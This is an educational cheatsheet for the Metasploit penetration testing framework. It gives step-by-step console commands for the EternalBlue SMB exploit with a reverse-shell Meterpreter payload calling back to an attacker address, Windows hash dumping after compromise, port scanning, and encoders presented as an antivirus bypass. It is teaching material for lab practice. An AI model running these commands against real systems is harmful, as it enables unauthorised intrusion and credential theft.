# Metasploit Framework Cheatsheet

## Introduction

Metasploit is a powerful penetration testing framework used for discovering, exploiting, and validating vulnerabilities in systems. This cheatsheet explains every major feature, option, and module type along with commands and examples.

---

## 👨‍💻 Author Introduction  

Hello! I am **Muhammad Saqlain Shoukat** also known as **Dark Wolf** founder and developer of **Coding Chat Room**, a passionate learner and creator in the field of **Cybersecurity, Programming, and DevSecOps**.  

🔹 My mission is to make **complex technical concepts simple and easy** so that students and professionals can learn without confusion.  
🔹 On my platforms, I share tutorials, study notes, and practical tips about **Linux, Ethical Hacking, Development, Programming and Cybersecurity**.  
🔹 I believe in **learning by sharing** — the more we teach, the more we grow.  

---

## Table of Contents

1. Starting Metasploit
2. Searching Modules
3. Exploit Modules
4. Payloads
5. Auxiliary Modules
6. Post Exploitation Modules
7. Encoders and Nops
8. Global Settings
9. Useful Commands
10. Example Scenarios

---

> **Watch Demo**: You can also watch demo for its learning from here 👉: [Metasploit in 1 Video](https://www.youtube.com/@CodingChatRoom)

## 1. Starting Metasploit

```bash
msfconsole
```

* Starts the Metasploit Framework.
* Loads all modules: exploits, payloads, auxiliary, post, encoders.

---

## 2. Searching Modules

```bash
search <keyword>
search smb
search ssh
search ms17_010
```

* Finds modules by service, vulnerability, CVE, or protocol.
* Returns module name, rank, disclosure date, and description.

Example:

```bash
msf6 > search eternalblue
0 exploit/windows/smb/ms17_010_eternalblue
```

---

## 3. Exploit Modules

* Exploits target vulnerabilities to gain access.
* Use an exploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue
use 0  # shortcut using index
```

* Show required options:

```bash
show options
```

* Set target options:

```bash
set RHOSTS 192.168.108.26
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.108.73
```

* Run exploit:

```bash
exploit
```

### Key Options:

* `RHOSTS` = Target IP
* `RPORT` = Target port (default 445 for SMB)
* `TARGET` = Select target manually
* `PAYLOAD` = Defines the code executed on target
* `LHOST` = Attacker IP
* `LPORT` = Attacker port

---

## 4. Payloads

* Payloads define what runs on target after exploit.
* Types:

  * Reverse TCP
  * Bind TCP
  * Meterpreter (advanced shell)

Example:

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

---

## 5. Auxiliary Modules

* For scanning, brute forcing, fuzzing without exploiting.
* Example: TCP port scan

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.108.26
set PORTS 1-1000
run
```

* Other types: scanners, fuzzers, sniffers.

---

## 6. Post Exploitation Modules

* Actions after successful exploitation.
* Example: Dump Windows hashes

```bash
use post/windows/gather/hashdump
set SESSION 1
run
```

* Other actions: privilege escalation, system info collection.

---

## 7. Encoders and Nops

* Encoders: Bypass antivirus detection.
* Nops: Ensure exploit stability.

```bash
show encoders
show nops
```

* Use with payloads if needed:

```bash
set ENCODER x86/shikata_ga_nai
```

---

## 8. Global Settings

* Apply to all modules to save time.

```bash
setg RHOSTS 192.168.108.26
setg LHOST 192.168.108.73
```

---

## 9. Useful Commands

```bash
sessions -l          # List active sessions
sessions -i 1        # Interact with session 1
background           # Send session to background
jobs                 # List background jobs
kill <job_id>        # Stop job
exit                 # Quit Metasploit
info <module>        # Show detailed info
```

---

## 10. Example Scenarios

1. **Exploit EternalBlue SMB**

```bash
search ms17_010
use 0
show options
set RHOSTS 192.168.108.26
set LHOST 192.168.108.73
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

2. **TCP Port Scan**

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.108.26
set PORTS 1-1000
run
```

3. **Dump Windows Hashes**

```bash
use post/windows/gather/hashdump
set SESSION 1
run
```

---

## References

* Official Metasploit Docs: [https://docs.metasploit.com/](https://docs.metasploit.com/)
* Exploit DB: [https://www.exploit-db.com/](https://www.exploit-db.com/)
* MS17-010 Details: [https://nvd.nist.gov/vuln/detail/CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)

---

*This cheatsheet is for educational purposes and safe lab practice only.*

---

## 📚 More Learning & Connect with Me

If you found this helpful and want to learn more about **hacking, cybersecurity, and coding**, follow me here and **Star this Resporatory**:

- 🎥 **YouTube**: [Coding Chat Room](https://www.youtube.com/@CodingChatRoom)  
- 📸 **Instagram**: [@codingchatroom](https://www.instagram.com/codingchatroom/?igsh=czBrcjAyYmxma2du)
- 💻 GitHub: [Coding Chat Room](https://github.com/CodingChatRoom)

💡 I share tutorials, tips, and resources to make learning **cybersecurity and coding easier**.  
Don’t forget to **subscribe & follow** for more updates and **Star this Resporatory** 🚀  
